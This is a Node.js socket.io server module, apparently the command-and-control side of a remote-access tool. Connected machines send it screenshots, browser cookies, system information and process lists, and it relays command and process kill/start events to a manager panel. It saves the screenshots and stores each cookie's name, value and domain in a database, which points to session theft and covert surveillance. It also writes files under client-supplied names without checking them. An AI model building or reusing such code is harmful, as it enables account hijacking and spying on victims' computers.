const cache = require('../cache');
const fs = require('fs');
const path = require('path');

const {Client, Cookie, Screenshoot} = require('../sequelize');

module.exports = (namespace, sio) => {
    namespace.on('connection', socket => {
        console.log(`Client ${socket.id} connected`)
        let clients = cache.get('clients');
        clients.push(socket.id);
        cache.set('clients', clients);
        socket.join(socket.id);

        // Dodajhmey do bazy
        Client.create({sid: socket.id});

        sio.of('/manager').emit('client_connected', {client: socket.id})
        sio.of('/manager').emit('notification', {message: `Polaczono ${socket.id}`, pos: 'bottom-right', status: 'success'})

        socket.on('disconnect', () => {
            //console.log(clients);
            const clientId = clients.indexOf(socket.id)
            clients.splice(clientId, 1);
            cache.set('clients', clients);
            console.log(`Client ${socket.id} disconnected`)
            sio.of('/manager').emit('client_disconnected', {client: socket.id})
            sio.of('/manager').emit('notification', {message: `Rozlaczono ${socket.id}`, pos: 'bottom-right', status: 'danger'})
        })

        socket.on('get_screenshoot', async (data) => {
            console.log(data);
            const image = data.img
            const filename = data.filename
            const ssDir = `public/screenshoots/`;
            fs.writeFile(path.join(ssDir, filename), image, async (e) => {
                if (e) {
                    return console.log(e);
                }
                const client = await Client.findOne({where: {sid: data.clientId}});
                await Screenshoot.create({
                    filename: filename,
                    ClientId: client.dataValues.id
                })
                console.log(`File ${filename} saved`);
            })
            sio.of('/manager').emit('ss_btn', {state: true})
        })

        socket.on('website', (data) => {
            sio.of('/manager').emit('website_btn', {state: true})
            sio.of('/manager').emit('notification', {...data.notification})
        })

        socket.on('command', (data) => {
            sio.of('/manager').emit('command', data);
        })

        socket.on('systemInfo', (data) => {
            sio.of('/manager').emit('systemInfo', data)
        })

        socket.on("process_list", (data) => {
            sio.of("/manager").emit('process_list', data);
        });

        socket.on("process_kill", (data) => {
            sio.of("/manager").emit('process_kill', data);
        })

        socket.on("process_start", (data) => {
            sio.of("/manager").emit('process_start', data);
        })

        socket.on("notification", (data) => {
            sio.of('/manager').emit('notification', {...data.notification})
        })

        socket.on('cookies', async (data) => {
            const client = await Client.findOne({where: {sid: data.clientId}});
            console.log(client);
            for (const [key, value] of Object.entries(data.cookies))
            {
                await Cookie.create({
                    name: value.name,
                    value: value.value,
                    domain: value.domain,
                    path: value.path,
                    secure: value.secure,
                    expires: value.expires,
                    ClientId: client.dataValues.id
                })
            }
            sio.of('/manager').emit('cookies', {cookies: data.cookies})
        })

        socket.on("progress", (data) => {
            sio.of('/manager').emit('progress', data)
            console.log(data);
        })
    })
}